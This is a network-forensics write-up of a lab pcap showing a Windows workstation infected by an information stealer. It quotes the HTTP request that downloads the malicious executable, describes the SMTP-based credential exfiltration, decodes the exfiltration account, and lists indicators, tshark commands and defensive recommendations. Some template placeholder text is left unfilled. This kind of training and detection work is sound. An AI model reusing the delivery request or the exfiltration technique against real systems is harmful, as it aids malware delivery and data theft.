# Red Team Report

## Cover Information

| Field | Detail |
|---|---|
| Project | HawkEye Lab Analysis |
| Author | Mohan Singh Parmar |
| Version | 1.0 |
| Date | 2026-07-04 |
| Classification | Internal / Portfolio Use |
| Source Evidence | `stealer.pcap` (4,003 packets, ~63m 41s capture window, 2019-04-10 20:37:07 – 21:40:48 UTC) |

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Objective](#objective)
3. [Scope](#scope)
4. [Lab Overview](#lab-overview)
5. [Attack Methodology](#attack-methodology)
6. [Attack Timeline](#attack-timeline)
7. [Tools Used](#tools-used)
8. [Commands Used](#commands-used)
9. [Findings](#findings)
10. [Risk Assessment](#risk-assessment)
11. [Recommendations](#recommendations)
12. [Lessons Learned](#lessons-learned)
13. [Conclusion](#conclusion)
14. [References](#references)

---

## Executive Summary

This report documents the offensive activity reconstructed from network capture `stealer.pcap`, gathered during the HawkEye Lab exercise. The capture shows an end-user workstation (`Beijing-5cd1-PC`, `10.4.10.132`) inside the `pizzajukebox.com` Active Directory domain being infected with a Windows executable retrieved from an external HTTP server, followed by periodic outbound connectivity checks and recurring SMTP sessions consistent with credential/data exfiltration. No lateral movement, privilege escalation, or additional host compromise was observed in this capture; the traffic reflects a single-host commodity information-stealer infection chain rather than a multi-stage red team engagement.

The findings below are structured using standard red team / attacker kill-chain phases so the exercise can be used for internal training on how such traffic appears on the wire, and to drive detection-engineering work described in the companion Blue Team and Purple Team reports.

---

## Objective

- Reconstruct, from network traffic alone, the actions an attacker (or attacker-controlled malware) took against the victim host.
- Identify the delivery mechanism, dropped artifact, and post-infection network behavior.
- Provide a factual, evidence-based attacker narrative that Blue Team detection engineering and Purple Team validation can be built against.

> **Note:** This is a passive network-forensics reconstruction, not a live-fire red team engagement. Where a standard red team report section (e.g., Privilege Escalation, Persistence) has no corresponding evidence in the capture, this is stated explicitly rather than assumed.

---

## Scope

**Target**

| Item | Value |
|---|---|
| Victim host | `Beijing-5cd1-PC` / `10.4.10.132` |
| Domain | `pizzajukebox.com` |
| Domain Controller | `PizzaJukebox-DC` / `10.4.10.4` |
| Capture file | `stealer.pcap` (SHA256: `22106927c11836d29078dfbec20be9d6b61b1f3f47f95c758acc47a1fb424e51`) |

**Assumptions**

- The capture represents a single infected endpoint on a small Windows Active Directory network.
- All external IP addresses observed are treated as attacker/malicious infrastructure unless clearly identifiable as legitimate (e.g., `update.googleapis.com`, `dns.msftncsi.com`).
- Traffic outside this pcap (endpoint telemetry, disk forensics, memory capture) was not available for this analysis; conclusions are limited to what is observable on the wire.

**Rules of Engagement**

Replace this section with your actual HawkEye Lab rules of engagement (authorization scope, time window, permitted techniques, and points of contact), if this exercise was conducted as a live simulated engagement rather than a pcap-only review.

---

## Lab Overview

HawkEye Lab is a network-forensics and detection-engineering exercise built around a single packet capture of a real-world information-stealer infection against a Windows domain-joined workstation. The lab is designed to let a learner:

1. Practice extracting attacker infrastructure and artifacts from raw pcap using `tshark`/Wireshark.
2. Map observed behavior to a kill-chain / MITRE ATT&CK model.
3. Build detection content (SIEM/IDS rules) against the reconstructed behavior.

Unlike a conventional red-team lab with attacker and defender infrastructure running side by side, HawkEye Lab works backward from a single artifact (the pcap) to reconstruct what "the red team" (in this case, the malware author/operator) did.

---

## Attack Methodology

### Reconnaissance

**Passive Recon**

No evidence of external passive reconnaissance (e.g., WHOIS lookups, OSINT scraping) against the target organization is visible in this capture, since passive recon typically does not touch the target network.

**Active Recon**

Once resident on the host, the malware performed low-noise, repeated self-reconnaissance rather than reconnaissance of the wider network:

- Approximately every 10 minutes, the infected host issued an HTTP `GET /` request to `bot.whatismyipaddress.com` (`66.171.248.178`). This is a common malware technique used to fingerprint the victim's public/external IP address and confirm outbound internet connectivity — effectively "check-in" recon rather than network scanning.
- No port scans, ARP sweeps, or SMB enumeration of *other* hosts on the `10.4.10.0/24` segment were observed. The only SMB/LDAP traffic present is normal Kerberos-authenticated communication between the victim host and its own Domain Controller.

### Enumeration

- **Ports:** No inbound listener or reverse-shell port was observed being opened on the victim host. Outbound connections were made to TCP/80 (HTTP delivery and C2 check-in) and TCP/25 (SMTP exfiltration).
- **Services:** Standard Windows domain services (Kerberos/TCP 88, LDAP/TCP 389, SMB/TCP 445) were used for legitimate domain authentication and were not abused for enumeration in this capture.
- **Users:** The domain account context used for the workstation's own Kerberos exchanges is `beijing-5cd1-pc$` (the computer account). Credentials used in the SMTP `AUTH LOGIN` exchange decode to `sales.del@macwinlogistics.in`.
- **Technologies:** Windows Server / Active Directory environment (domain `pizzajukebox.com`), consistent with a typical corporate Windows estate.
- **Directories:** No directory brute-forcing (web or SMB share enumeration) was observed.

### Vulnerability Assessment

No vulnerability scanning traffic (e.g., automated scanner signatures, exploit probes) is present in this capture. The infection vector observed is a user-initiated or script-initiated download of an executable over plain HTTP, not exploitation of a specific software vulnerability.

### Exploitation

The "exploitation" phase in this capture consists of a direct file download and (inferred) execution of a malicious binary:

```
GET /proforma/tkraw_Protected99.exe HTTP/1.1
Host: proforma-invoices.com
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
```

Key facts:

| Attribute | Value |
|---|---|
| Delivery domain | `proforma-invoices.com` (resolved to `217.182.138.150`) |
| File requested | `/proforma/tkraw_Protected99.exe` |
| File size | 2,025,472 bytes |
| File type | PE32 executable (GUI), Intel 80386, 5 sections |
| MD5 | `71826ba081e303866ce2a2534491a2f7` |
| SHA256 | `62099532750dad1054b127689680c38590033fa0bdfa4fb40c7b4dcb2607fb11` |

The filename theme (`proforma`, "invoices") and the deliberately old/spoofed `MSIE 7.0` user-agent string are both consistent with a phishing-lure-driven, business-email-compromise-style delivery pattern commonly used by commodity information stealers, though the phishing email/lure itself is not present in this capture.

###### The HTTP GET request for `tkraw_Protected99.exe` in Wireshark

![WireShark](/screenshots/wireshark.png)

### Privilege Escalation

No privilege escalation activity (token manipulation, UAC bypass, exploitation of a local vulnerability, scheduled task creation, service creation) is visible in this network capture. This does not rule out local privilege escalation on the host — it simply means the network layer alone does not evidence it. Endpoint/host forensics would be required to confirm or rule this out.

### Persistence

No clear persistence mechanism (e.g., beaconing to a second-stage C2 with regular restart-survival intervals over multiple days, or observable DNS patterns consistent with a persistence check-in schedule) can be confirmed from ~63 minutes of capture. The repeated ~10-minute check-ins to `bot.whatismyipaddress.com` and the repeated SMTP exfiltration sessions do suggest the malware is running as a persistent, timer-driven process for at least the duration of the capture.

### Post Exploitation

Observed post-exploitation/attacker-objective activity:

- **Data exfiltration via SMTP:** The infected host repeatedly connected to an external mail server at `23.229.162.69:25` and performed a full SMTP session (`EHLO` → `AUTH LOGIN` → `MAIL FROM` → `RCPT TO` → `DATA`) sending mail from and to `sales.del@macwinlogistics.in`. This "mail-to-self" pattern is a well-documented technique used by infostealer malware families (e.g., HawkEye-style keyloggers) to exfiltrate captured credentials, keystrokes, or screenshots to an attacker-controlled inbox using compromised or attacker-registered SMTP credentials.
- **Repeated exfiltration cadence:** This SMTP exfiltration sequence recurred at approximately 20:38, 20:48, 20:58, 21:08, 21:18, 21:28, and 21:38 (UTC) — a ~10-minute interval matching the IP-check beacon cadence, strongly suggesting a single scheduled task/timer in the malware driving both behaviors.
- **DNS pattern:** Each exfiltration cycle was preceded by a DNS lookup for `macwinlogistics.in`, matching the domain used in the SMTP credentials and envelope addresses.

---

## Attack Timeline

| Time (UTC) | Event |
|---|---|
| 20:37:07 | Capture begins; routine Kerberos/DC traffic between `10.4.10.132` and `10.4.10.4` |
| 20:37:54 | HTTP GET for `/proforma/tkraw_Protected99.exe` from `proforma-invoices.com` (217.182.138.150) — malicious binary delivered |
| 20:38:15 | First outbound `GET /` to `bot.whatismyipaddress.com` (IP/connectivity check) |
| 20:38:16 | First SMTP exfiltration session to `23.229.162.69:25` (`AUTH LOGIN` as `sales.del@macwinlogistics.in`) |
| 20:48:20 – 20:48:21 | Second IP-check and SMTP exfiltration cycle |
| 20:58:24 – 20:58:25 | Third IP-check and SMTP exfiltration cycle |
| 21:08:30 | Fourth IP-check (`bot.whatismyipaddress.com`) |
| 21:18:34 | Fifth IP-check (`bot.whatismyipaddress.com`) |
| 21:28:38 – 21:28:38 | IP-check and SMTP exfiltration cycle |
| 21:38:42 – 21:38:42 | Final observed IP-check and SMTP exfiltration cycle in this capture |
| 21:40:48 | Capture ends |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Wireshark / `tshark` | Packet capture inspection, protocol dissection, object/file extraction |
| `capinfos` | Capture file metadata and hashing |
| `sha256sum` / `md5sum` | Hashing extracted binary for threat-intel lookup |
| Base64 decoder | Decoding the SMTP `AUTH LOGIN` credential exchange |

Replace this section with any additional attacker/operator tooling identified via sandbox detonation of the extracted binary, if performed as part of your HawkEye Lab work.

---

## Commands Used

Representative `tshark` commands used to reconstruct this attack from the pcap:

##### Capture summary
```bash
capinfos stealer.pcap
```
##### Protocol breakdown
```bash
tshark -r stealer.pcap -q -z io,phs
```

##### All HTTP requests
```bash
tshark -r stealer.pcap -Y http.request -T fields \
  -e frame.time -e ip.src -e ip.dst -e http.host \
  -e http.request.method -e http.request.uri -e http.user_agent
```

##### Extract HTTP-delivered files (including the malicious .exe)
```bash
tshark -r stealer.pcap --export-objects http,./extracted
```

##### All SMTP commands/parameters
```bash
tshark -r stealer.pcap -Y smtp -T fields \
  -e frame.time -e ip.src -e ip.dst -e smtp.req.command -e smtp.req.parameter
```

##### Decode the base64 SMTP AUTH LOGIN credential
```bash
echo "c2FsZXMuZGVsQG1hY3dpbmxvZ2lzdGljcy5pbg==" | base64 -d
```

---

## Findings

| Finding | Severity | Description |
|---|---|---|
| Malicious executable delivered over unencrypted HTTP | High | A PE32 executable was downloaded over plaintext HTTP from `proforma-invoices.com`, with no TLS and a suspicious lure-style filename. |
| Data exfiltration over SMTP to external mailbox | Critical | Repeated automated SMTP sessions send data from the infected host to an external mailbox under attacker-registered credentials, consistent with credential/keylogger exfiltration. |
| Recurring "IP check" beacon to third-party service | Medium | Regular, scripted `GET /` requests to `whatismyipaddress.com` indicate malware-driven environment fingerprinting, a strong host-compromise indicator. |
| Spoofed/outdated User-Agent string | Low–Medium | The HTTP download used a deliberately old `MSIE 7.0` user-agent, inconsistent with the OS/browser fingerprint of a modern managed endpoint, and useful as a detection signature. |
| No lateral movement observed | Informational | All AD/SMB/LDAP traffic in the capture is consistent with normal domain-joined workstation behavior; no evidence of the infected host pivoting to other hosts. |

---

## Risk Assessment

The observed activity represents a **High** overall risk to the organization:

- **Confidentiality impact:** High — the SMTP exfiltration pattern indicates ongoing loss of sensitive data (likely credentials, keystrokes, or screen captures) to an external, attacker-controlled mailbox at regular intervals.
- **Integrity impact:** Low (within the scope of this capture) — no evidence of data or configuration tampering was observed.
- **Availability impact:** Low — no denial-of-service or destructive behavior was observed.
- **Likelihood of recurrence:** High if the delivery mechanism (phishing/lure download) and the C2 mail infrastructure remain unaddressed, since this class of malware is typically distributed at scale via mass phishing campaigns.

---

## Recommendations

1. Block and sinkhole the identified attacker infrastructure: `proforma-invoices.com` / `217.182.138.150`, `macwinlogistics.in`, and mail server `23.229.162.69`.
2. Add the file hashes (MD5 `71826ba081e303866ce2a2534491a2f7`, SHA256 `62099532750dad1054b127689680c38590033fa0bdfa4fb40c7b4dcb2607fb11`) to endpoint/AV and EDR blocklists.
3. Enforce outbound SMTP restrictions from end-user workstations — legitimate mail should flow only through the organization's approved mail relay, not directly from endpoints to arbitrary external mail servers on TCP/25.
4. Deploy HTTP/HTTPS proxy inspection and block executable downloads from uncategorized/newly registered domains.
5. Isolate and reimage `Beijing-5cd1-PC`; rotate any credentials that may have been present in memory, browser stores, or clipboard on that host at the time of infection.
6. Conduct host-based forensics (memory and disk) on the affected endpoint to confirm persistence mechanism and full scope of data accessed, since network capture alone cannot fully answer this.

---

## Lessons Learned

- A single pcap, properly dissected, can reconstruct a full delivery-to-exfiltration attacker narrative even without endpoint telemetry.
- Recurring, fixed-interval beacon patterns (here, ~10 minutes) are a strong and relatively simple detection signal, even when the payload itself is encrypted or obfuscated.
- Plaintext protocols (HTTP, SMTP) used by commodity malware remain highly visible on the wire — full-packet capture and SMTP/HTTP session logging are highly valuable, low-cost detection investments.

---

## Conclusion

The `stealer.pcap` capture documents a complete, low-sophistication information-stealer infection chain: delivery over HTTP, host/environment fingerprinting via a third-party IP-check service, and recurring SMTP-based exfiltration to an external, attacker-controlled mailbox. While no lateral movement or privilege escalation was observed, the confirmed data exfiltration pattern represents a serious confidentiality risk that should be treated as a priority incident. The Blue Team and Purple Team reports build directly on these findings to define detection content and long-term mitigations.

---

## References

- Wireshark/`tshark` documentation: <https://www.wireshark.org/docs/>
- MITRE ATT&CK Framework: <https://attack.mitre.org/>
- Replace this section with any additional HawkEye Lab reference material, threat-intel lookups on the extracted hash, or internal documentation used during this analysis.